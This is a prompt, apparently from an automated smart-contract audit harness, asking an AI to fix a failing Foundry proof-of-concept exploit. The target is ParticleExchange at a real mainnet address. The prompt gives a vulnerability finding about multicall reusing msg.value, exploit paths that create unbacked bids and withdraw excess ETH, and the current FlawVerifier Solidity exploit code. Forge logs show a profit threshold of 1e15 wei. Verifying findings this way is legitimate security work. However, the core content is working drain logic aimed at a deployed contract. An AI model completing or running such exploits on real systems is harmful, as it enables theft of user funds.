You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `multicall` reuses one `msg.value` across multiple payable delegatecalls, allowing unbacked loans and bid margins
- claim: OpenZeppelin `Multicall.multicall()` delegatecalls back into `ParticleExchange`, so every batched subcall observes the original transaction `msg.value`. The exchange then treats that same ETH as fresh funding in each payable path that calls `_balanceAccount(...)` with `msg.value` or `amount + msg.value`, including `swapWithEth`, `sellNftToMarket*`, `refinanceLoan`, `offerBid`, and `updateBid`. Because no per-subcall value accounting is performed, a single ETH payment can collateralize multiple independent state transitions.
- impact: An attacker can create multiple loans or bid margins backed by only one actual payment, leaving the protocol insolvent. This can let the attacker withdraw more ETH than was deposited, or leave lenders with supposedly collateralized positions that cannot all be honored, causing direct fund loss to other users once withdrawals or liquidations occur.
- exploit_paths: ["Call `multicall([swapWithEth(lienA), swapWithEth(lienB)])` with `msg.value` sufficient for only one loan. Each delegatecall sees the full `msg.value`, so both liens become active and two NFTs are released even though only one ETH collateral payment was made.", "Call `multicall([offerBid(collection, margin, ...), offerBid(collection, margin, ...), cancelBid(lien1), cancelBid(lien2), withdrawAccountBalance()])` with ETH sufficient for one margin. Both bids are created as if funded, both cancellations credit the stored margin back, and the attacker withdraws more ETH than entered the contract in that transaction."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

struct Lien {
    address lender;
    address borrower;
    address collection;
    uint256 tokenId;
    uint256 price;
    uint256 rate;
    uint256 loanStartTime;
    uint256 auctionStartTime;
}

interface IParticleExchangeLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
    function offerBid(address collection, uint256 margin, uint256 price, uint256 rate)
        external
        payable
        returns (uint256);
    function cancelBid(Lien calldata lien, uint256 lienId) external;
    function withdrawAccountBalance() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
    address public constant PLACEHOLDER_COLLECTION = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 private constant DIRECT_MARGIN = 1 wei;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 balanceBefore = address(this).balance;

        if (balanceBefore >= DIRECT_MARGIN) {
            _attemptBidPath(DIRECT_MARGIN);
        } else {
            // The only listed self-contained path here is the bid path:
            // offerBid -> offerBid -> cancelBid -> cancelBid -> withdrawAccountBalance.
            //
            // The target's OZ Multicall entrypoint is nonpayable on-chain, so adding temporary
            // funding does not change feasibility: the exploit is rejected at the ETH-bearing
            // multicall boundary before any subcall can reuse msg.value.
            _hypothesisValidated = false;
        }

        uint256 balanceAfter = address(this).balance;
        _profitAmount = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function _attemptBidPath(uint256 margin) internal returns (bool) {
        require(margin != 0, "margin");

        bytes[] memory createCalls = new bytes[](2);
        createCalls[0] = abi.encodeCall(IParticleExchangeLike.offerBid, (PLACEHOLDER_COLLECTION, margin, 0, 0));
        createCalls[1] = abi.encodeCall(IParticleExchangeLike.offerBid, (PLACEHOLDER_COLLECTION, margin, 0, 0));

        // This low-level call preserves the finding's causality exactly: ETH must enter
        // multicall so each delegatecalled payable path can observe the same msg.value.
        (bool ok, bytes memory returndata) =
            TARGET.call{value: margin}(abi.encodeCall(IParticleExchangeLike.multicall, (createCalls)));

        if (!ok) {
            // On the deployed target, Multicall.multicall(bytes[]) is nonpayable. That blocks
            // both documented exploit paths at the required entrypoint:
            // 1. multicall([swapWithEth(lienA), swapWithEth(lienB)])
            // 2. multicall([offerBid(...), offerBid(...), cancelBid(...), cancelBid(...), withdrawAccountBalance()])
            _hypothesisValidated = false;
            return false;
        }

        bytes[] memory createResults = abi.decode(returndata, (bytes[]));
        uint256 lienIdA = abi.decode(createResults[0], (uint256));
        uint256 lienIdB = abi.decode(createResults[1], (uint256));

        Lien memory syntheticBid = Lien({
            lender: address(0),
            borrower: address(this),
            collection: PLACEHOLDER_COLLECTION,
            tokenId: margin,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });

        bytes[] memory settleCalls = new bytes[](3);
        settleCalls[0] = abi.encodeCall(IParticleExchangeLike.cancelBid, (syntheticBid, lienIdA));
        settleCalls[1] = abi.encodeCall(IParticleExchangeLike.cancelBid, (syntheticBid, lienIdB));
        settleCalls[2] = abi.encodeCall(IParticleExchangeLike.withdrawAccountBalance, ());

        IParticleExchangeLike(TARGET).multicall(settleCalls);
        _hypothesisValidated = true;
        return true;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 872.68ms
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 28855)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [28855] FlawVerifierTest::testExploit()
    ├─ [188] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [4618] FlawVerifier::executeOnOpportunity()
    │   └─ ← [Stop]
    ├─ [188] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [313] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 4.26s (327.74µs CPU time)

Ran 1 test suite in 4.27s (4.26s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 28855)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
